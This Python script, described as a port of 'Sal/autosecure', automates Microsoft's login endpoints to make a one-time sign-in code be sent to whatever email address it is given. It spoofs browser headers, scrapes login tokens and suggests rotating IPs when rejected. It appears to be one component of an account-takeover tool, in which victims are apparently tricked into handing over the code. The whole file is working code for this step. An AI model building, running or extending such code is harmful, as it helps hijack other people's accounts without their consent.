#!/usr/bin/env python3
"""
OTP send — port of Sal/autosecure securing/auth/send_auth.py

Modern Microsoft flow:
  GetCredentialType → GetOneTimeCode.srf (eOTT_OtcLogin)
NOT the old empty-password ipt/pprid identity page.
"""
from __future__ import annotations

import json
import re
import sys

try:
    import httpx
except ImportError:
    print(json.dumps({"ok": False, "error": "httpx not installed — run: pip install httpx"}))
    sys.exit(0)


def get_session() -> httpx.Client:
    return httpx.Client(
        timeout=30.0,
        follow_redirects=True,
        headers={
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        },
    )


def get_live_data(session: httpx.Client) -> dict:
    response = session.post("https://login.live.com")
    url_post = re.search(
        r"https://login\.live\.com/ppsecure/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0",
        response.text,
    )
    if not url_post:
        url_post = re.search(
            r"https://login\.live\.com/ppsecure/post\.srf\?[^\"'\\\s]+",
            response.text,
        )
    if not url_post:
        raise RuntimeError("Failed to extract urlPost")
    ppft = re.search(r'value=\\?"([^"]+)"', response.text)
    if not ppft:
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response.text)
    if not ppft:
        raise RuntimeError("Failed to extract PPFT")
    return {"urlPost": url_post.group(0), "ppft": ppft.group(1)}


def send_auth_and_otp(session: httpx.Client, email: str) -> dict:
    """
    Port of Sal autosecure send_auth.py:
    - GetCredentialType with forceotclogin=False
    - If OtcLoginEligibleProofs: POST GetOneTimeCode.srf with eOTT_OtcLogin
    """
    # Warm cookies
    live = get_live_data(session)
    flowtoken = live["ppft"]

    send_auth = session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": session.headers.get("Cookie")
            or "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33",
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": flowtoken,
            "forceotclogin": False,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": False,
            "isOtherIdpSupported": False,
            "isReactLoginRequest": True,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email,
        },
    )

    try:
        email_info = send_auth.json()
    except Exception:
        return {
            "ok": False,
            "error": f"GetCredentialType non-JSON HTTP {send_auth.status_code}",
        }

    if "Credentials" not in email_info:
        err = email_info.get("ErrorHR") or email_info.get("error") or ""
        keys = list(email_info.keys())
        msg = "Microsoft GetCredentialType failed"
        if err:
            msg += f" (ErrorHR={err})"
        if keys:
            msg += f" keys={keys[:6]}"
        return {"ok": False, "error": msg, "rawKeys": keys}

    creds = email_info["Credentials"]

    if creds.get("RemoteNgcParams"):
        return {"ok": False, "error": "Authenticator-only account (not supported yet)"}

    proofs = creds.get("OtcLoginEligibleProofs") or []
    if not proofs:
        pref = creds.get("PrefCredential")
        return {
            "ok": False,
            "error": f"No email OTP proofs (PrefCredential={pref})",
        }

    selected = proofs[0]
    alt_email_e = selected.get("data") or ""
    security_mail = selected.get("display") or "unknown"
    if not alt_email_e:
        return {"ok": False, "error": "Empty proof data from OtcLoginEligibleProofs"}

    # Fresh PPFT for GetOneTimeCode
    live2 = get_live_data(session)
    flowtoken = live2["ppft"]

    # Sal autosecure payload
    payload = {
        "login": email,
        "flowtoken": flowtoken,
        "purpose": "eOTT_OtcLogin",
        "channel": "Email",
        "ChallengeViewSupported": "1",
        "AltEmailE": alt_email_e,
        "lcid": "1033",
    }

    # Primary email receives OTPs (no separate security email)
    if security_mail == email or security_mail.replace("*", "") in email:
        payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"

    # Try both form and JSON content-types (MS accepts form-urlencoded in Sal's code)
    resp = session.post(
        url="https://login.live.com/GetOneTimeCode.srf?id=38936",
        headers={
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
        },
        data=payload,
    )

    body_text = (resp.text or "")[:400]
    state = None
    try:
        j = resp.json()
        state = j.get("State") or j.get("state")
        # Common success: State 200 / 201; sometimes SessionState
        if state in (200, 201, "200", "201"):
            return {
                "ok": True,
                "securityEmail": security_mail,
                "proofId": alt_email_e,
                "ppft": flowtoken,
                "detail": f"GetOneTimeCode State={state}",
            }
        # Some responses return empty object or FlowToken on success
        if resp.status_code == 200 and (
            j.get("FlowToken")
            or j.get("flowToken")
            or state in (0, "0", None)
            and not j.get("Error")
            and not j.get("error")
            and not j.get("ErrorCode")
        ):
            # State 204 was a false success before — only accept explicit success or empty OK
            if state in (204, "204"):
                return {
                    "ok": False,
                    "error": f"GetOneTimeCode rejected (State=204). Try again or rotate IP. body={body_text[:120]}",
                    "securityEmail": security_mail,
                    "proofId": alt_email_e,
                }
            if state is None and len(j) <= 2:
                # treat ambiguous as failure with detail
                return {
                    "ok": False,
                    "error": f"GetOneTimeCode ambiguous response: {body_text[:200]}",
                    "securityEmail": security_mail,
                    "proofId": alt_email_e,
                }
        err = j.get("Error") or j.get("error") or j.get("ErrorCode") or j.get("err")
        return {
            "ok": False,
            "error": f"GetOneTimeCode HTTP {resp.status_code} State={state} err={err} body={body_text[:160]}",
            "securityEmail": security_mail,
            "proofId": alt_email_e,
        }
    except Exception:
        if resp.status_code == 200 and len(body_text) < 5:
            return {
                "ok": True,
                "securityEmail": security_mail,
                "proofId": alt_email_e,
                "ppft": flowtoken,
                "detail": "empty 200 body",
            }
        return {
            "ok": False,
            "error": f"GetOneTimeCode HTTP {resp.status_code}: {body_text[:200]}",
            "securityEmail": security_mail,
            "proofId": alt_email_e,
        }


def main() -> None:
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "usage: send_ott.py <email>"}))
        return
    email = sys.argv[1].strip()
    try:
        with get_session() as session:
            result = send_auth_and_otp(session, email)
            print(json.dumps(result))
    except Exception as e:
        print(json.dumps({"ok": False, "error": str(e)}))


if __name__ == "__main__":
    main()
